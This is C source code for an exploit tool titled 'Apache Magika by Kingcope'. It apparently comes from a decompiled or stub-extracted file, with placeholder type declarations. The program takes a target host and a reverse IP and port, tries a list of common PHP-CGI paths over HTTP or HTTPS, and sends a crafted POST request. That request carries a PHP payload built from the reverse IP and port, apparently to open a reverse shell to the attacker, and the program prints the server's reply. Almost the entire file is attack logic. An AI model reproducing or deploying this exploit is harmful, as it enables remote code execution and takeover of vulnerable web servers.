
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_3__ TYPE_1__ ;


struct sockaddr_in {int dummy; } ;
struct option {char* member_0; int member_3; int member_2; int const member_1; } ;
struct TYPE_3__ {int * handle; int * ctx; } ;
typedef TYPE_1__ connection ;


 int AF_INET ;
 int SOCK_STREAM ;
 int * SSL_CTX_new (int ) ;
 int SSL_connect (int *) ;
 int SSL_library_init () ;
 int * SSL_new (int *) ;
 int SSL_set_fd (int *,int) ;
 int SSL_write (int *,char*,int) ;
 int SSLv23_client_method () ;
 unsigned short atoi (char*) ;
 char* calloc (unsigned int,int) ;
 scalar_t__ connect (int,void*,int) ;
 int exit (int) ;
 struct sockaddr_in* gethostbyname_ (char*,unsigned short) ;
 int getopt_long (int,char**,char*,struct option*,int*) ;
 scalar_t__ malloc (int) ;
 int memcpy (char*,char*,int) ;
 char* optarg ;
 int optind ;
 char* phpstr ;
 char* poststr ;
 int printf (char*,...) ;
 char* read_ (int) ;

 int snprintf (char*,unsigned int,char*,char*,...) ;
 int socket (int ,int ,int ) ;
 char* sslread (TYPE_1__*) ;
 int strcmp (char*,char*) ;
 char* strdup (char*) ;
 int strlen (char*) ;
 int usage (char**) ;
 int write (int,char*,int) ;

void main(int argc, char *argv[])
{
  char *target, *protocol, *targetip, *writestr, *tmpstr, *readbuf=((void*)0),
   *interpreter, *reverseip, *reverseportstr, *forceinterpreter=((void*)0);
  char httpsflag=0;
  unsigned short port=0, reverseport=0;
  struct sockaddr_in *server;
  int sockfd;
  unsigned int writesize, tmpsize;
  unsigned int i;
  connection *sslconnection;
  printf("-== Apache Magika by Kingcope ==-\n");
  for(;;)
  {
  int c;
     int option_index=0;
     static struct option long_options[] = {
    {"target", 128, 0, 0 },
    {"port", 128, 0, 0 },
    {"protocol", 128, 0, 0 },
    {"reverse-ip", 128, 0, 0 },
    {"reverse-port", 128, 0, 0 },
    {"force-interpreter", 128, 0, 0 },
    {0, 0, 0, 0 }
   };

  c = getopt_long(argc, argv, "", long_options, &option_index);
     if (c < 0)
      break;

     switch (c) {
  case 0:
   switch (option_index) {
    case 0:
     if (optarg) {
      target = calloc(strlen(optarg)+1, sizeof(char));
      if (!target) {
    printf("calloc error (2)\n");
       exit(255);
         }
      memcpy(target, optarg, strlen(optarg)+1);
     }
        break;
       case 1:
        if(optarg)
      port = atoi(optarg);
        break;
       case 2:
        protocol = calloc(strlen(optarg)+1, sizeof(char));
        if (!protocol) {
      printf("calloc error (3)\n");
         exit(255);
        }
        memcpy(protocol, optarg, strlen(optarg)+1);
        if (!strcmp(protocol, "https"))
         httpsflag=1;
        break;
       case 3:
        reverseip = calloc(strlen(optarg)+1, sizeof(char));
        if (!reverseip) {
      printf("calloc error (4)\n");
         exit(255);
        }
        memcpy(reverseip, optarg, strlen(optarg)+1);
        break;
       case 4:
     reverseport = atoi(optarg);
  reverseportstr = calloc(strlen(optarg)+1, sizeof(char));
        if (!reverseportstr) {
      printf("calloc error (5)\n");
         exit(255);
        }
        memcpy(reverseportstr, optarg, strlen(optarg)+1);
        break;
       case 5:
        forceinterpreter = calloc(strlen(optarg)+1, sizeof(char));
        if (!forceinterpreter) {
      printf("calloc error (6)\n");
         exit(255);
        }
        memcpy(forceinterpreter, optarg, strlen(optarg)+1);
        break;
       default:
        usage(argv);
   }
   break;

  default:
   usage(argv);
     }
  }

  if ((optind < argc) || !target || !protocol || !port ||
      !reverseip || !reverseport){
 usage(argv);
  }

  server = gethostbyname_(target, port);
  if (!server) {
   printf("Error while resolving hostname. (7)\n");
   exit(255);
  }

  char *interpreters[5];
  int ninterpreters = 5;
  interpreters[0] = strdup("/cgi-bin/php");
  interpreters[1] = strdup("/cgi-bin/php5");
  interpreters[2] = strdup("/cgi-bin/php-cgi");
  interpreters[3] = strdup("/cgi-bin/php.cgi");
  interpreters[4] = strdup("/cgi-bin/php4");

  for (i=0;i<ninterpreters;i++) {
   interpreter = interpreters[i];
   if (forceinterpreter) {
     interpreter = strdup(forceinterpreter);
   }
   if (forceinterpreter && i)
    break;
   printf("%s\n", interpreter);

   sockfd = socket(AF_INET, SOCK_STREAM, 0);
   if (sockfd < 1) {
  printf("socket error (8)\n");
  exit(255);
   }

   if (connect(sockfd, (void*)server, sizeof(struct sockaddr_in)) < 0) {
    printf("connect error (9)\n");
    exit(255);
   }
   if (httpsflag) {
    sslconnection = (connection*) malloc(sizeof(connection));
    if (!sslconnection) {
     printf("malloc error (10)\n");
     exit(255);
    }
    sslconnection->handle = ((void*)0);
    sslconnection->ctx = ((void*)0);

    SSL_library_init();

    sslconnection->ctx = SSL_CTX_new(SSLv23_client_method());
    if (!sslconnection->ctx) {
   printf("SSL_CTX_new error (11)\n");
     exit(255);
    }

    sslconnection->handle = SSL_new(sslconnection->ctx);
    if (!sslconnection->handle) {
   printf("SSL_new error (12)\n");
  exit(255);
    }
    if (!SSL_set_fd(sslconnection->handle, sockfd)) {
   printf("SSL_set_fd error (13)\n");
     exit(255);
    }

    if (SSL_connect(sslconnection->handle) != 1) {
  printf("SSL_connect error (14)\n");
     exit(255);
    }
   }

   tmpsize = strlen(phpstr) + strlen(reverseip) + strlen(reverseportstr) + 64;
   tmpstr = (char*)calloc(tmpsize, sizeof(char));
   snprintf(tmpstr, tmpsize, phpstr, reverseip, reverseport);

   writesize = strlen(target) + strlen(interpreter) +
     strlen(poststr) + strlen(tmpstr) + 64;
   writestr = (char*)calloc(writesize, sizeof(char));
   snprintf(writestr, writesize, poststr, interpreter,
     target, strlen(tmpstr), tmpstr);

   if (!httpsflag) {
  write(sockfd, writestr, strlen(writestr));
  readbuf = read_(sockfd);
   } else {
  SSL_write(sslconnection->handle, writestr, strlen(writestr));
  readbuf = sslread(sslconnection);
   }

   if (readbuf) {
     printf("***SERVER RESPONSE***\n\n%s\n\n", readbuf);
   } else {
    printf("read error (15)\n");
    exit(255);
   }
  }
  exit(1);
}
